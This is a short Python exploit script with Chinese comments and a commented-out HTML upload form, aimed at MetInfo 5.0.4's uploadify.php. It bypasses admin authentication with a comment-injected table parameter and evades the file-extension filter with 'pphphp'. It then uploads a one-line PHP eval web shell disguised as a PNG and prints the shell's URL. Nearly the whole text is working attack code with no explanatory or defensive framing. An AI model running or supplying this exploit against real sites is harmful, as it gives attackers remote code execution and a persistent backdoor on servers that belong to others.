# <html> 
# <form enctype="multipart/form-data" method="post" name="myForm" action="http://192.168.1.10/MetInfo5.0.4//admin/include/uploadify.php?metinfo_admin_id=aaa&metinfo_admin_pass=bbb&met_admin_table=met_admin_table%23&type=upfile&met_file_format=jpg|pphphp" >
# <input name="Filedata" type="file" size=20> 
# <input type="submit" name="Submit" value="submit"> 
# </form> 
# </html> 

import requests
#定义URL
url = "http://192.168.1.10/MetInfo5.0.4/"
#利用漏洞URL
fullUrl = url+"/admin/include/uploadify.php?metinfo_admin_id=aaa&metinfo_admin_pass=bbb&met_admin_table=met_admin_table%23&type=upfile&met_file_format=jpg|pphphp"
#文件内容一句话
payload = "<?=@eval($_REQUEST[777])?>"

#http请求的其他参数
#文件
files = {'Filedata':('a.php',payload,'image/png')}
#提交按钮
data = {'Submit':'submit'}

#发起请求
res = requests.post(url = fullUrl , files = files , data = data)

#截取返回的路径
shellPath = res.text[4:]
shellPath = url + shellPath

print(shellPath)